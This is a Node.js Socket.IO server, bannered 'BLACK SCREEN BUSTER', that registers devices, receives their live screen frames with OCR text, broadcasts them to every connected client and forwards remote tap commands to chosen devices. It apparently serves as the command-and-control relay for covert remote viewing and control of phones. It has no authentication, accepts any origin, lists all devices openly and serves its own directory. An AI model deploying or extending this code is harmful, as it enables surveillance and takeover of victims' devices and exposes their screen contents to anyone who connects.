const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 3000,
    maxHttpBufferSize: 200e6
});

app.use(compression());
app.use(express.static('.'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();
const GLOBAL_ROOM = 'all-screens-live';

app.get('/devices', (req, res) => res.json(Array.from(devices.entries())));

io.on('connection', (socket) => {
    console.log(`🔌 ${socket.id.slice(0,8)} CONNECTED`);
    socket.join(GLOBAL_ROOM);
    
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        devices.set(deviceId, { ...deviceInfo, connected: true, socketId: socket.id, lastSeen: Date.now() });
        socket.join(`device_${deviceId}`);
        console.log(`✅ LIVE: ${deviceId.slice(0,12)} | ${deviceInfo.model}`);
        io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
    });

    // 🔥 FRAME + LAYOUT ANALYSIS
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
            
            // 🔥 SEND TO ALL WEB + OCR DATA
            const enhancedData = {
                ...frameData,
                layoutAnalysis: frameData.layoutAnalysis || {}, // OCR result
                fps: frameData.fps || 22
            };
            
            io.to(GLOBAL_ROOM).emit('screen-frame', enhancedData);
            socket.to(`device_${deviceId}`).emit('screen-frame', enhancedData);
        }
    });

    socket.on('control', (controlData) => {
        const { deviceId, action, x, y } = controlData;
        if (devices.has(deviceId)) {
            console.log(`🎮 ${action.toUpperCase()} ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
            socket.to(`device_${deviceId}`).emit('control', controlData);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🎯 BLACK SCREEN BUSTER LIVE! PORT ${PORT}`);
    console.log(`🌐 http://0.0.0.0:${PORT}\n`);
});
